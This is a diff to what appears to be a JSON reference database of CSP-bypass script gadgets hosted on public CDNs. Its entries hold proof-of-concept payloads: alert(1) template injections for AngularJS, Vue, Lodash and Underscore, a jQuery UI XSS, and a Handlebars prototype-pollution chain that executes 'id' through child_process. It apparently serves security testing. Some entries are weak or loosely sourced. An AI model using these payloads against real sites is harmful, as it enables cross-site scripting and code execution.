@@ -44,6 +44,51 @@
       "payload": "<div data-dojo-type=\"dijit/Declaration\" data-dojo-props=\"widgetClass:'x',defaults:{onclick:function(){alert(1)}}\">",
       "notes": "Dojo's declarative widget system can execute JS through template attributes.",
       "references": []
+    },
+    {
+      "library": "vue",
+      "vulnerable_path": "/ajax/libs/vue/2.*/vue.js",
+      "max_safe_version": "3.0.0",
+      "technique": "Vue.js template injection (dev build)",
+      "payload": "<div id=app>{{constructor.constructor('alert(1)')()}}</div><script src='vue.js'></script><script>new Vue({el:'#app'})</script>",
+      "notes": "Vue 2.x dev builds with runtime compiler allow template injection similar to AngularJS.",
+      "references": ["https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets"]
+    },
+    {
+      "library": "underscore",
+      "vulnerable_path": "/ajax/libs/underscore.js/*/underscore-min.js",
+      "max_safe_version": null,
+      "technique": "Underscore.js template() RCE",
+      "payload": "_.template('<%= constructor.constructor(\"alert(1)\")() %>')();",
+      "notes": "If attacker controls template string input to _.template(), arbitrary JS execution.",
+      "references": []
+    },
+    {
+      "library": "lodash",
+      "vulnerable_path": "/ajax/libs/lodash.js/*/lodash.min.js",
+      "max_safe_version": null,
+      "technique": "Lodash template() RCE + prototype pollution",
+      "payload": "_.template('<%= constructor.constructor(\"alert(1)\")() %>')();",
+      "notes": "Same as underscore; also vulnerable to prototype pollution in older versions.",
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-10744"]
+    },
+    {
+      "library": "handlebars",
+      "vulnerable_path": "/ajax/libs/handlebars.js/*/handlebars.min.js",
+      "max_safe_version": "4.7.7",
+      "technique": "Handlebars prototype pollution to RCE",
+      "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+      "notes": "Handlebars < 4.7.7 vulnerable to prototype pollution leading to RCE via template compilation.",
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-23369"]
+    },
+    {
+      "library": "ember",
+      "vulnerable_path": "/ajax/libs/ember.js/*/ember.min.js",
+      "max_safe_version": null,
+      "technique": "Ember.js Handlebars template injection",
+      "payload": "{{debugger}}",
+      "notes": "Ember uses Handlebars templates; debug helpers and lookups can lead to code execution.",
+      "references": []
     }
   ],
   "cdn.jsdelivr.net": [
@@ -73,6 +118,24 @@
       "payload": "Ember.lookup.alert(1)",
       "notes": "Ember debug builds expose global lookup that can be abused for code execution.",
       "references": []
+    },
+    {
+      "library": "vue",
+      "vulnerable_path": "/npm/vue@2.*/dist/vue.js",
+      "max_safe_version": "3.0.0",
+      "technique": "Vue.js template injection (dev build with compiler)",
+      "payload": "<div id=app>{{constructor.constructor('alert(1)')()}}</div>",
+      "notes": "Vue 2.x full build on jsDelivr.",
+      "references": []
+    },
+    {
+      "library": "lodash",
+      "vulnerable_path": "/npm/lodash@*/lodash.min.js",
+      "max_safe_version": null,
+      "technique": "Lodash template() and prototype pollution",
+      "payload": "_.template('${constructor.constructor(\"alert(1)\")()}')();",
+      "notes": "Lodash on jsDelivr.",
+      "references": []
     }
   ],
   "unpkg.com": [
@@ -92,6 +155,24 @@
       "technique": "Knockout.js data-bind injection",
       "payload": "<div data-bind=\"template: { name: 'x', afterRender: alert }\">",
       "notes": "Knockout.js on unpkg.",
+      "references": []
+    },
+    {
+      "library": "vue",
+      "vulnerable_path": "/vue@2.*/dist/vue.js",
+      "max_safe_version": "3.0.0",
+      "technique": "Vue.js template injection",
+      "payload": "<div id=app>{{constructor.constructor('alert(1)')()}}</div>",
+      "notes": "Vue 2.x full build on unpkg.",
+      "references": []
+    },
+    {
+      "library": "react-dev",
+      "vulnerable_path": "/react@*/umd/react.development.js",
+      "max_safe_version": null,
+      "technique": "React development build with extra attack surface",
+      "payload": "React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED",
+      "notes": "React dev builds expose internals. Not directly exploitable but increases attack surface.",
       "references": []
     }
   ],
@@ -113,6 +194,15 @@
       "payload": "<div data-dojo-type=\"dijit/Declaration\">...</div>",
       "notes": "Google-hosted Dojo.",
       "references": []
+    },
+    {
+      "library": "jquery-ui",
+      "vulnerable_path": "/ajax/libs/jqueryui/*/jquery-ui.min.js",
+      "max_safe_version": "1.12.0",
+      "technique": "jQuery UI dialog XSS",
+      "payload": "$('<div>').dialog({title:'<img src=x onerror=alert(1)>'})",
+      "notes": "jQuery UI < 1.12.0 has XSS in dialog title option.",
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2016-7103"]
     }
   ],
   "code.jquery.com": [
@@ -137,6 +227,39 @@
       "references": []
     }
   ],
+  "cdn.bootcss.com": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/angular.js/1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection",
+      "payload": "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+      "notes": "Chinese BootCSS CDN hosting AngularJS.",
+      "references": []
+    }
+  ],
+  "lib.sinaapp.com": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/js/angular.js/angular-1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection",
+      "payload": "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+      "notes": "Sina App CDN hosting AngularJS.",
+      "references": []
+    }
+  ],
+  "cdn.staticfile.org": [
+    {
+      "library": "angularjs",
+      "vulnerable_path": "/angular.js/1.*/angular.min.js",
+      "max_safe_version": "1.6.0",
+      "technique": "AngularJS template injection",
+      "payload": "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+      "notes": "StaticFile CDN hosting AngularJS.",
+      "references": []
+    }
+  ],
   "raw.githubusercontent.com": [
     {
       "library": "any",
@@ -156,6 +279,28 @@
       "technique": "Arbitrary JS hosting",
       "payload": "Attacker hosts malicious JS via RawGit CDN",
       "notes": "RawGit serves GitHub files with proper content types. Same risk as raw.githubusercontent.com.",
+      "references": []
+    }
+  ],
+  "gitcdn.xyz": [
+    {
+      "library": "any",
+      "vulnerable_path": "/*",
+      "max_safe_version": null,
+      "technique": "Arbitrary JS hosting via Git CDN",
+      "payload": "Attacker hosts malicious JS on their own Git repo",
+      "notes": "gitcdn.xyz serves raw files from GitHub with CDN caching.",
+      "references": []
+    }
+  ],
+  "cdn.statically.io": [
+    {
+      "library": "any",
+      "vulnerable_path": "/gh/*",
+      "max_safe_version": null,
+      "technique": "Arbitrary JS hosting via Statically CDN",
+      "payload": "Attacker hosts malicious JS served through Statically's GitHub proxy",
+      "notes": "Statically proxies GitHub raw content with CDN. Attacker-controlled content.",
       "references": []
     }
   ]
